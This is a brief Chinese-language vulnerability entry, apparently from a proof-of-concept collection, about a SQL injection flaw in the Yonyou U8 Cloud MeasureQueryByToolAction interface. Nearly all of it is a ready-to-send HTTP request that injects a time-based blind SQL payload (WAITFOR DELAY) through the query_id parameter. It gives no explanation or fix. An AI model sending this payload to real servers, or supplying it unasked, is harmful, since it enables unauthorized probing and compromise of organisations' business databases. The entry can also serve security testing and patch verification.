## 用友U8cloud接口MeasureQueryByToolAction存在SQL注入漏洞


## poc
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction&method=execute&query_id=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
Host: url
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

```
